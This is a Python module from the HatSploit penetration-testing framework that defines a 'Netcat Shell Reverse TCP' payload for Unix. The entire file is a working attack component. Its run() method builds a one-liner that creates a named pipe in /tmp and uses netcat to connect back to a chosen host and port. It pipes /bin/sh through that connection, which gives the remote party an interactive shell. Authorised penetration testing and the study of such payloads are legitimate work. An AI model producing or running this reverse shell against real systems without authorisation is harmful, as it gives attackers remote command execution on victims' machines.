#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload

from hatsploit.utils.tcp import TCPClient
from hatsploit.utils.string import StringTools


class HatSploitPayload(Payload, StringTools):
    details = {
        'Category': "single",
        'Name': "Netcat Shell Reverse TCP",
        'Payload': "unix/generic/netcat_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Netcat shell reverse TCP payload.",
        'Architecture': "generic",
        'Platform': "unix",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    def run(self):
        connback_host, connback_port = self.parse_options(self.options)

        filename = self.random_string(8)
        payload = f"mkfifo /tmp/{filename}; nc {connback_host} {connback_port} 0</tmp/{filename} | /bin/sh >/tmp/{filename} 2>&1; rm /tmp/{filename}"

        return payload
